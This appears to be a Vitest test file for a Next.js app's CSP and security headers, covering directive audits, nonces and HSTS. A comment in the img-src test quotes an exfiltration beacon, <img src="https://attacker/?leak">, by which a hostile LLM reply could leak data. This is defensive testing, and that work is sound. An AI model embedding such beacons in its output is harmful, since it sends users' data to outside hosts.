// @vitest-environment node
import { describe, expect, it } from "vitest";
import {
  buildReportOnlyCsp,
  enforcedCsp,
  generateNonce,
  staticSecurityHeaders,
} from "./security-headers";

function parse(policy: string): Map<string, string[]> {
  const map = new Map<string, string[]>();
  for (const directive of policy.split(";")) {
    const parts = directive.trim().split(/\s+/).filter(Boolean);
    if (parts.length === 0) continue;
    map.set(parts[0], parts.slice(1));
  }
  return map;
}

describe("enforcedCsp", () => {
  it("carries the framing + injection floor", () => {
    const d = parse(enforcedCsp(false));
    expect(d.get("frame-ancestors")).toEqual(["'none'"]);
    expect(d.get("object-src")).toEqual(["'none'"]);
    expect(d.get("base-uri")).toEqual(["'self'"]);
    expect(d.get("form-action")).toEqual(["'self'"]);
  });

  it("only enforces fetch directives that were individually audited as safe here — never a blanket one", () => {
    // #501 review finding: an earlier version of this test claimed "every
    // enforced directive is a non-fetch directive, so none can block a
    // resource." That's false — `object-src` IS a CSP fetch directive
    // (https://www.w3.org/TR/CSP3/#directives-fetch) and `object-src 'none'`
    // absolutely can block a resource (an <object>/<embed> load), same as
    // `form-action` can block a form submission. The old list quietly
    // omitted `object-src` to keep this assertion green, which is a test
    // shaped to fit a claim rather than reality.
    //
    // The TRUE invariant: every enforced directive — fetch or not — has been
    // individually audited against this codebase and cannot block anything
    // the app actually does:
    //   - object-src 'none'  — no <object>/<embed>/<applet> anywhere in the
    //     codebase, and DOMPurify's default allowlist excludes both tags, so
    //     even a hostile LLM reply can't reintroduce one.
    //   - form-action 'self' — the only <form> (settings/page.tsx) posts
    //     same-origin to /api/auth/logout; /signin is a plain <a> link, not
    //     a form; Apple's `form_post` back to the callback is governed by
    //     Apple's own CSP, not ours.
    //   - frame-ancestors / base-uri — not fetch directives at all; nothing
    //     in this app is ever framed or relies on a non-'self' <base>.
    //
    // Any FETCH directive not on this short, audited allowlist (default-src,
    // script-src, style-src, img-src, font-src, connect-src, media-src,
    // worker-src, manifest-src, frame-src, script-src-elem, script-src-attr,
    // style-src-elem, style-src-attr, prefetch-src) enforcing it here would
    // be exactly the class of bug #501 exists to prevent: shipping a
    // resource-blocking rule without measuring it report-only first. Adding
    // one has to be a deliberate change to this test, including a fresh
    // audit comment like the ones above.
    const auditedSafeFetchDirectives = new Set(["object-src"]);
    const allFetchDirectives = [
      "default-src",
      "script-src",
      "script-src-elem",
      "script-src-attr",
      "style-src",
      "style-src-elem",
      "style-src-attr",
      "img-src",
      "font-src",
      "connect-src",
      "media-src",
      "object-src",
      "worker-src",
      "manifest-src",
      "frame-src",
      "prefetch-src",
    ];
    const d = parse(enforcedCsp(false));
    for (const name of allFetchDirectives) {
      if (auditedSafeFetchDirectives.has(name)) {
        expect(d.has(name), `${name} is on the audited allowlist and should be enforced`).toBe(true);
      } else {
        expect(d.has(name), `${name} is not audited-safe and must not be enforced yet`).toBe(false);
      }
    }
  });

  it("only upgrades insecure requests outside development", () => {
    // Browsers ignore `upgrade-insecure-requests` in a report-only policy and
    // log a console error for every page load when it appears there, so it
    // lives in the enforcing header — but not on plain-http localhost.
    expect(enforcedCsp(false)).toContain("upgrade-insecure-requests");
    expect(enforcedCsp(true)).not.toContain("upgrade-insecure-requests");
  });
});

describe("buildReportOnlyCsp", () => {
  it("embeds the nonce in script-src so Next.js can parse it back out", () => {
    // Next.js finds the nonce by scanning the script-src (falling back to
    // default-src) for a `'nonce-...'` source. If it moves out of script-src,
    // every inline bootstrap script silently loses its nonce.
    const policy = buildReportOnlyCsp("abc123==", false);
    expect(parse(policy).get("script-src")).toContain("'nonce-abc123=='");
  });

  it("does not allow inline or eval'd script in production", () => {
    const scriptSrc = parse(buildReportOnlyCsp("n", false)).get("script-src")!;
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(scriptSrc).not.toContain("'unsafe-eval'");
    // 'strict-dynamic' would disable the 'self' source in CSP3 browsers and
    // take Next's <link rel=preload as=script> tags with it.
    expect(scriptSrc).not.toContain("'strict-dynamic'");
    expect(scriptSrc).toContain("'self'");
  });

  it("allows eval only in development, where React and HMR need it", () => {
    expect(parse(buildReportOnlyCsp("n", true)).get("script-src")).toContain(
      "'unsafe-eval'",
    );
  });

  it("bounds img-src to same-origin, data: and blob:", () => {
    // The #501 headline: DOMPurify keeps <img src="https://attacker/?leak">,
    // so an LLM reply could beacon data out with scripts already blocked.
    const imgSrc = parse(buildReportOnlyCsp("n", false)).get("img-src")!;
    expect(imgSrc.sort()).toEqual(["'self'", "blob:", "data:"]);
    expect(imgSrc.some((s) => s.startsWith("http"))).toBe(false);
    expect(imgSrc).not.toContain("*");
  });

  it("keeps a nonce out of style-src", () => {
    // A nonce (or hash) in style-src makes browsers ignore 'unsafe-inline',
    // which would kill every React `style={{...}}` attribute in the app.
    const styleSrc = parse(buildReportOnlyCsp("abc", false)).get("style-src")!;
    expect(styleSrc).toContain("'unsafe-inline'");
    expect(styleSrc.some((s) => s.startsWith("'nonce-"))).toBe(false);
  });

  it("omits upgrade-insecure-requests (ignored in report-only policies)", () => {
    expect(buildReportOnlyCsp("n", false)).not.toContain(
      "upgrade-insecure-requests",
    );
  });

  it("includes the enforcing floor so the two headers cannot diverge", () => {
    const report = parse(buildReportOnlyCsp("n", false));
    for (const [name, sources] of parse(enforcedCsp(true))) {
      expect(report.get(name), `${name} missing from report-only`).toEqual(
        sources,
      );
    }
  });
});

describe("staticSecurityHeaders", () => {
  function byKey(isDev: boolean): Map<string, string> {
    return new Map(staticSecurityHeaders(isDev).map((h) => [h.key, h.value]));
  }

  it("sets the enforcing non-CSP headers", () => {
    const h = byKey(false);
    expect(h.get("X-Content-Type-Options")).toBe("nosniff");
    expect(h.get("X-Frame-Options")).toBe("DENY");
    expect(h.get("Referrer-Policy")).toBe("strict-origin-when-cross-origin");
    expect(h.get("Permissions-Policy")).toContain("camera=()");
    expect(h.get("Content-Security-Policy")).toBe(enforcedCsp(false));
  });

  it("declares HSTS in production only, without preload", () => {
    // `preload` is an apex-domain commitment that is painful to unwind.
    const hsts = byKey(false).get("Strict-Transport-Security")!;
    expect(hsts).toContain("max-age=63072000");
    expect(hsts).toContain("includeSubDomains");
    expect(hsts).not.toContain("preload");
    expect(byKey(true).has("Strict-Transport-Security")).toBe(false);
  });
});

describe("generateNonce", () => {
  it("returns 128 bits of base64 with no HTML-escape characters", () => {
    const nonce = generateNonce();
    // Next.js throws if the nonce contains characters it would have to escape.
    expect(nonce).toMatch(/^[A-Za-z0-9+/=]+$/);
    expect(Buffer.from(nonce, "base64")).toHaveLength(16);
  });

  it("is unique per call", () => {
    const seen = new Set(Array.from({ length: 200 }, () => generateNonce()));
    expect(seen.size).toBe(200);
  });
});

describe("next.config wiring", () => {
  it("applies the static headers to every path", async () => {
    // Guards the actual delivery mechanism, not just the values: without a
    // `headers()` entry in next.config.ts none of the above ever reaches a
    // browser, which was the state of the app before #501.
    const config = (await import("../../next.config")).default;
    const entries = await config.headers!();
    const all = entries.find((e) => e.source === "/:path*");
    expect(all, "expected a catch-all headers() entry").toBeTruthy();
    const keys = all!.headers.map((h) => h.key);
    expect(keys).toContain("Content-Security-Policy");
    expect(keys).toContain("X-Content-Type-Options");
    expect(keys).toContain("X-Frame-Options");
    expect(keys).toContain("Referrer-Policy");
    expect(keys).toContain("Permissions-Policy");
  });
});
